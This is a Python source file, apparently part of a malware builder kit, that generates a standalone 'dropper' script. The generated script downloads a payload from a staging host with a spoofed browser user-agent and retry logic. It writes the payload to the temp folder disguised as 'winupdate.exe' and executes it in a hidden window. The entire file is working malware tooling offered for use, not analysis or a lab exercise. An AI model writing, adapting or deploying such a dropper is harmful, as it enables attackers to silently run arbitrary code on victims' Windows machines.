"""
dropper.py
Downloads payload from staging URL and executes in memory or on disk.
Includes basic user-agent spoofing and retry logic.

Author: db88
"""

import urllib.request
import os
import sys
import time
import subprocess

# default staging — override via builder.py or config.yaml
DEFAULT_STAGING = "https://files.update-service.xyz/dl/"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

MAX_RETRIES = 3
RETRY_DELAY = 10  # seconds


def generate(payload_name="payload.bin", staging_url=DEFAULT_STAGING):
    """Generate a standalone dropper script."""
    
    template = f"""
import urllib.request
import os
import sys
import time
import subprocess
import tempfile

STAGING_URL = "{staging_url}{payload_name}"
USER_AGENT = "{USER_AGENT}"
MAX_RETRIES = {MAX_RETRIES}
RETRY_DELAY = {RETRY_DELAY}

def fetch(url):
    \"\"\"Download payload with retry.\"\"\"
    for attempt in range(MAX_RETRIES):
        try:
            req = urllib.request.Request(url, headers={{"User-Agent": USER_AGENT}})
            with urllib.request.urlopen(req, timeout=30) as resp:
                return resp.read()
        except Exception as e:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY)
            else:
                return None

def execute(data):
    \"\"\"Write to temp and execute.\"\"\"
    tmp = os.path.join(tempfile.gettempdir(), "winupdate.exe")
    with open(tmp, "wb") as f:
        f.write(data)
    # hidden window
    subprocess.Popen([tmp], creationflags=0x08000000)

if __name__ == "__main__":
    data = fetch(STAGING_URL)
    if data:
        execute(data)
"""
    return template
